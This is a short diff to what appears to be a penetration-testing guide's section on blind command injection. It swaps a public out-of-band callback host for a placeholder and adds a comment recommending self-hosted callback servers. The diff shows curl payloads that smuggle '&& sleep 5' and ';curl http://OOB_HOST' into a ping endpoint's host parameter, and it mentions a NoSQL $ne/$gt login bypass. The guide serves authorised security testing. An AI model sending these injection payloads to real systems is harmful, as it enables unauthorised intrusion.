@@ -47,7 +47,7 @@ Confirm: the `$ne`/`$gt` body authenticates where a wrong password does not.
 - Blind → prove with **out-of-band** or a time delay (least destructive):
 ```bash
 curl -s "https://TARGET/ping?host=127.0.0.1%20%26%26%20sleep%205"      # timing oracle
-curl -s "https://TARGET/ping?host=127.0.0.1;curl%20http://OOB_ID.oast.pro"   # OOB DNS/HTTP via interactsh/Burp Collaborator
+curl -s "https://TARGET/ping?host=127.0.0.1;curl%20http://OOB_HOST"   # OOB_HOST: a self-hosted interactsh or private Collaborator, never a public one
 ```
 Confirm with a callback hit or a reproducible delay. Never run destructive commands (`rm`, shutdown) — `id`/`hostname`/`nslookup` is enough.
 
